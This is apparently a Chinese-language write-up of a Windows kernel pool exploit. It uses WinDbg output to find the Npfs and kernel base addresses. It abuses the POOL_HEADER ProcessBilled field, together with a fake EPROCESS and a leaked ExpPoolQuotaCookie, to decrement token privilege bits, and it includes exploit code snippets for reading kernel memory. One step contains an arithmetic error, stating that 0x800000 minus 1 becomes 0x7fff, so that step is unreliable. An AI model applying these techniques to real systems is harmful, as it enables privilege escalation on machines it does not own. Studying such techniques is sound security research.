### 优化后的文本

#### 内存转储分析
使用调试器 `kd` 对 `_FILE_OBJECT`、`_DEVICE_OBJECT` 和 `_DRIVER_OBJECT` 进行内存转储分析，以获取相关信息。

1. **_FILE_OBJECT 结构体**
   ```plaintext
   kd> dt _FILE_OBJECT 0xFFFFE103010A18F0
   ntdll!_FILE_OBJECT
      +0x000 Type             : 0n5
      +0x002 Size             : 0n216
      +0x008 DeviceObject     : 0xffffe102`faf538f0 _DEVICE_OBJECT
      +0x010 Vpb              : (null)
      +0x018 FsContext        : 0xffffb800`09002980 Void
      +0x020 FsContext2       : 0xffffb800`0885a051 Void
   ```

2. **_DEVICE_OBJECT 结构体**
   ```plaintext
   kd> dt _DEVICE_OBJECT 0xffffe102`faf538f0
   ntdll!_DEVICE_OBJECT
      +0x000 Type             : 0n3
      +0x002 Size             : 0x308
      +0x004 ReferenceCount   : 0n2768
      +0x008 DriverObject     : 0xffffe102`facd8ce0 _DRIVER_OBJECT
      +0x010 NextDevice       : (null)
      +0x018 AttachedDevice   : 0xffffe102`fc56ace0 _DEVICE_OBJECT
   ```

3. **_DRIVER_OBJECT 结构体**
   ```plaintext
   kd> dt _DRIVER_OBJECT 0xffffe102`facd8ce0
   ntdll!_DRIVER_OBJECT
      +0x000 Type             : 0n4
      +0x002 Size             : 0n336
      +0x008 DeviceObject     : 0xffffe102`faf538f0 _DEVICE_OBJECT
      +0x010 Flags            : 0x12
      +0x018 DriverStart      : 0xfffff803`3f090000 Void
      +0x020 DriverSize       : 0x1c000
      +0x028 DriverSection    : 0xffffe102`faa457c0 Void
      +0x030 DriverExtension  : 0xffffe102`facd8e30 _DRIVER_EXTENSION
      +0x038 DriverName       : _UNICODE_STRING "\FileSystem\Npfs"
      +0x048 HardwareDatabase : 0xfffff803`3a3af8f8 _UNICODE_STRING "\REGISTRY\MACHINE\HARDWARE\DESCRIPTION\SYSTEM"
      +0x050 FastIoDispatch   : 0xffffe102`fa77ae60 _FAST_IO_DISPATCH
      +0x058 DriverInit       : 0xfffff803`3f0a8010     long  Npfs!GsDriverEntry+0
      +0x060 DriverStartIo    : (null)
      +0x068 DriverUnload     : (null)
      +0x070 MajorFunction    : [28] 0xfffff803`3f09b670     long  Npfs!NpFsdCreate+0
   ```

4. **计算 Npfs 的基址**
   ```plaintext
   kd> ? 0xfffff803`3f09b670-0xB670
   Evaluate expression: -8782150565888 = fffff803`3f090000
   ```

5. **加载模块信息**
   ```plaintext
   kd> lmDvmNpfs
   start             end                 module name
   fffff803`3f090000 fffff803`3f0ac000   Npfs       (pdb symbols)          d:\symbolsxp\npfs.pdb\D55EC1D15C78BD2E15ACB3E1D6A1A1111\npfs.pdb
   Loaded symbol image file: Npfs.SYS
   Image path: Npfs.SYS
   Image name: Npfs.SYS
   Timestamp: B03ECFD3
   CheckSum: 000252E2
   ImageSize: 0001C000
   Translations: 0000.04b0 0000.04e4 0409.04b0 0409.04e4
   ```

6. **查找函数地址**
   ```plaintext
   kd> ? fffff803`3f090000 + 0x7050
   Evaluate expression: -8782150537136 = fffff803`3f097050
   kd> ln fffff803`3f097050
   (fffff803`3f097050)   Npfs!_imp_ExAllocatePoolWithTag
   (fffff803`3f097058)   Npfs!_imp_ExFreePoolWithTag
   kd> dq fffff803`3f097050 L1
   fffff803`3f097050  fffff803`39d6f010
   kd> ln fffff803`39d6f010
   (fffff803`39d6f010)   nt!ExAllocatePoolWithTag
   kd> ? fffff803`39d6f010 - 0x36f010
   Evaluate expression: -8782241333248 = fffff803`39a00000
   ```

7. **加载内核模块信息**
   ```plaintext
   kd> lmDvmNT
   start             end                 module name
   fffff803`39a00000 fffff803`3a4b6000   nt         (pdb symbols)          d:\symbolsxp\ntkrnlmp.pdb\90F5E1C8BBE1FE1FB8A714305EE06F361\ntkrnlmp.pdb
   Loaded symbol image file: ntkrnlmp.exe
   Image path: ntkrnlmp.exe
   Image name: ntkrnlmp.exe
   Timestamp: 4EFCF7A9
   CheckSum: 009785ED
   ImageSize: 00AB6000
   Translations: 0000.04b0 0000.04e4 0409.04b0 0409.04e4
   ```

#### POOL_HEADER 结构体
```c
struct POOL_HEADER {
    char PreviousSize;
    char PoolIndex;
    char BlockSize;
    char PoolType;
    int PoolTag;
    uint64_t ProcessBilled;
};
```

当 `PoolType` 中的 `PoolQuota` 位被设置时，`ProcessBilled` 字段将被使用。其值通过以下运算得到：
```c
ProcessBilled = EPROCESS_PTR ^ ExpPoolQuotaCookie ^ CHUNK_ADDR
```

在块释放时，内核会检查 `ProcessBilled` 字段编码的指针是否是一个有效的 `EPROCESS` 指针：
```c
process_ptr = (struct _EPROCESS *)(chunk_addr ^ ExpPoolQuotaCookie ^ chunk_addr->process_billed);
if (process_ptr) {
    if ((process_ptr->Header.Type & 0x7F) != 3) {
        KeBugCheckEx(...);
    }
}
```

如果指针有效，内核将尝试返还与 `EPROCESS` 相关的引用计数。如果此时 `EPROCESS` 是我们提供的 `FAKE_EPROCESS`，它将使用 `FAKE_EPROCESS` 结构体来解引用指针值，提供任意递减原语。递减的值是 `PoolHeader` 中的 `BlockSize`。

#### 提权方法
我们的最终目标是提权，通过设置 `EPROCESS` 中 `TOKEN` 结构体的 `Privileges.Enable` 和 `Privileges.Present` 字段来实现。默认情况下，低完整性级别的 `Token` 的 `Privileges.Present` 被设置为 `0x602880000`，`Privileges.Enable` 被设置为 `0x800000`。如果想获取更多权限，可以将 `Privileges.Enable` 减 1，使其变成 `0x7fff`，从而启用更多权限。

为了构造正确的 `FAKE_EPROCESS` 结构，我们需要获取 `ExpPoolQuotaCookie`、幽灵块的地址、EXP 进程的 `EPROCESS` 和 `TOKEN`。

```c
exploit_arbitrary_read(&xploit, xploit.kernel_base + NT_POOLQUOTACOOKIE_OFFSET, (char *)&xploit.ExpPoolQuotaCookie, 0x8);
printf("[+] ExpPoolQuotaCookie is : 0x%llx\n", xploit.ExpPoolQuotaCookie);

if (!find_self_eprocess(&xploit)) { // 获取 EXP 进程的 EPROCESS 地址
    goto leave;
}

exploit_arbitrary_read(&xploit, xploit.self_eprocess + 0x360, (char *)&xploit.self_token, 0x8);
xploit.self_token = xploit.self_token & (~0xF);
setup_fake_eprocess(&xploit);
```

获取到的值如下：
```plaintext
kd> ? fffff803`39a00000 + 0x5748D0
Evaluate expression: -8782235612976 = fffff803`39f748d0
kd> ln fffff803`39f748d0
(fffff803`39f748d0)   nt!ExpPoolQuotaCookie
kd> ? fffff803`39a00000 + 0x5743A0
Evaluate expression: -8782235614304 = fffff803`39f743a0
kd> ln fffff803`39f743a0
(fffff803`39f743a0)   nt!PsInitialSystemProcess
kd> dt nt!_EPROCESS 0xFFFFE102FFBBD0C0
+0x000 Pcb              : _KPROCESS
+0x2e0 ProcessLock      : _EX_PUSH_LOCK
+0x2e8 UniqueProcessId  : 0x00000000`0000073c
+0x2f0 ActiveProcessLinks : _LIST_ENTRY [ 0xffffe102`fa0c5370 - 0xffffe102`ffc09370 ]
+0x300 RundownProtect   : _EX_RUNDOWN_REF
+0x308 Flags2           : 0x200d000
+0x360 Token            : _EX_FAST_REF
+0x410 QuotaBlock       : 0xffffe102`fd322d40 _EPROCESS_QUOTA_BLOCK
+0x450 ImageFileName    : [15]  "poc_exploit-re"

kd> ? 0xFFFFE102FFBBD0C0+0x360
Evaluate expression: -34071980026848 = ffffe102`ffbbd420
kd> dq ffffe102`ffbbd420 L1
ffffe102`ffbbd420  ffffb800`08ddb064
kd> ? ffffb800`08ddb064 & 0xFFFFFFFFFFFFFFF0
Evaluate expression: -79164688453536 = ffffb800`08ddb060
```

这样我们就得到了真实的 `TOKEN` 值。